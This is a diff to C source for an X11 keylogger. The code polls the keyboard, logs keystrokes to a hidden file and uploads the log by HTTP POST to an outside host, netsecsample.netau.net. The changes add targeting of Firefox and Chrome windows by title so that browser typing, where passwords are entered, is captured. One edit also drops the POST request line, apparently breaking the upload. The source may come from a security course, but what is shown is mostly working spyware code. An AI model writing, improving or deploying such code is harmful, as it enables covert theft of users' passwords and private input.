@@ -4,6 +4,7 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <netdb.h>
+#include <X11/Xutil.h>
 #include <X11/Xlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -11,9 +12,11 @@
 #include <signal.h>
 #include <errno.h>
 #include <arpa/inet.h>
-#include <X11/keysym.h>
 
 //int lock = 0;
+int wanted=0;
+// update browser class list here
+char *monitor_list[] = {"Firefox", "chrome", NULL};
 
 int bit(unsigned char i) 
 {
@@ -59,14 +62,13 @@ struct conv_special {
 conv_tab_sp[] = {
 
     {"1","!"},    {"2","@"},    {"3", "#"},
-    {"tab","\t"},
-    {"space", " "},     {"exclam", "!"},    {"quotedbl", "\""},
-    {"4", "$"},{"5", "%"},    {"6", "^"},
-    {"7", "&"}, {"8", "*"},{"9", "("},
-    {"0", ")"},{"-", "_"},  {"=", "+"},
-    {",", "<"},     {".", ">"},     {"/", "?"},
+    {"tab","\t"}, {"space", " "}, {"exclam", "!"},
+    {"quotedbl", "\""}, {"4", "$"}, {"5", "%"},
+    {"6", "^"}, {"7", "&"}, {"8", "*"},{"9", "("},
+    {"0", ")"}, {"-", "_"},  {"=", "+"},
+    {",", "<"},   {".", ">"},     {"/", "?"},
     {"'", "\""},  {"[", "{"},     {"]", "}"},
-    {"\\", "|"},  {";", ":"}, {"`", ":"}, {"",""}
+    {"\\", "|"},  {";", ":"}, {"`", "~"}, {"",""}
 };
 
 int convert(char *data, char *out) {
@@ -142,11 +144,10 @@ void upload()
     FILE*       file;
     char        buf[4096];
     int         size, n, i, socket, fsize;
-    char        header[] =  "POST /upload.php HTTP/1.0\r\n"
-                            "Host: netsecsample.netau.net\r\n"
-                            "Content-Type: multipart/form-data; boundary=1727381797619608628249622620\r\n"
-                            "Connection: keep-alive\r\n"
-                            "Content-Length: %d\r\n\r\n";
+    char        header[]  =  "Host: netsecsample.netau.net\r\n"
+                             "Content-Type: multipart/form-data; boundary=1727381797619608628249622620\r\n"
+                             "Connection: keep-alive\r\n"
+                             "Content-Length: %d\r\n\r\n";
 
     char        startbuf[] = "--1727381797619608628249622620\r\n"
                              "Content-Disposition: form-data; name=\"file\"; filename=\"log.txt\"\r\n"
@@ -159,8 +160,7 @@ void upload()
         fseek(file, 0L, SEEK_END);
         fsize = ftell(file);
 
-        if (fsize < 50) {
-        	//lock = 0;
+        if (fsize < 512) {
         	fclose(file);
         	return;
         }
@@ -187,7 +187,7 @@ void upload()
         send(socket, endbuf, sizeof(endbuf), 0);
         fclose(file);
         remove(".log.log");
-         //lock = 0;
+        //lock = 0;
         read(socket, buf, sizeof(buf)-1);
     }
 }
@@ -197,7 +197,6 @@ void log1(char *buf, int masked,  char *c, int caps)
 	char in[128];
 	int err;
 	pthread_t tid=0;
-
 
 	if (strlen(buf) > 1) {// or ignore
 		if (convert(buf, in))
@@ -229,6 +228,33 @@ void log1(char *buf, int masked,  char *c, int caps)
 	printf("%c", *c);
 }
 
+int ourInterest(Display* d, Window w)
+{
+    Status status;
+    XClassHint *class;
+    char *window_name;
+    int i;
+
+    class = XAllocClassHint();
+    status = XGetClassHint(d, w, class);
+    if (XFetchName(d, w, &window_name)) {
+    //if (status != 0) {
+    //printf("%s\n", class->res_class);
+       for (i=0; monitor_list[i] != NULL; i++) {
+          if (strstr(window_name, monitor_list[i]) != NULL) {
+            XFree(class);
+            wanted = 1;
+            return 1;
+          }
+    	}
+  	}
+  	XFree(class);
+  	//if (monitor_list[i] == NULL)
+  		wanted = 0;
+
+  	return 1;
+}
+
 int main() 
 {
 	unsigned char szKey[32];
@@ -237,10 +263,13 @@ int main()
 	int masked=0, caps=0;
 	char kname[64], *keyname, keysym;
 	Display *display;	
+	char *window_name;
+	Window window, prev_w;
 	int i;
 	char current=0;
 	char loop;
 	int count=0;
+    int revert;
 
 	display = XOpenDisplay(NULL);
 	if(display == NULL) {
@@ -251,6 +280,18 @@ int main()
 	while (1) {
 		usleep(5000);
 		fflush(stdout);
+
+
+		XGetInputFocus(display, &window, &revert);
+		//if (XFetchName(display, window, &window_name)) {
+			//printf("monitor: %s\n", window_name);
+		//	ourInterest(display, window);
+
+			//prev_w = window;
+		//}
+		//else {
+		//if (window != prev_w) wanted = 0;
+		//}
 		XQueryKeymap(display, szKey);
 
 		loop = 0;
@@ -282,7 +323,10 @@ int main()
 							keyname = "return";
 						}
 
-						log1(keyname, masked, &current, caps);
+						//if (wanted)
+						XGetInputFocus(display, &window, &revert);
+						if (ourInterest(display, window))
+							log1(keyname, masked, &current, caps);
 					}
 					else {
 						if (strcmp(keyname, "Q") == 0) {
@@ -295,12 +339,14 @@ int main()
 							keyname = "";
 						}
 
-						log1(keyname, masked, &current, caps);
+						//if (wanted)
+						XGetInputFocus(display, &window, &revert);
+						if (ourInterest(display, window))
+							log1(keyname, masked, &current, caps);
 
 					} 
 				}
 				else {
-
 					if(keycode == 50 || keycode == 62) {
 						// shift is up
 						masked = 0;
@@ -320,8 +366,7 @@ int main()
 				}
 			}
 		}
-
-
+		//wanted = 0;
 	}
 	XCloseDisplay(display);
 	return 0;
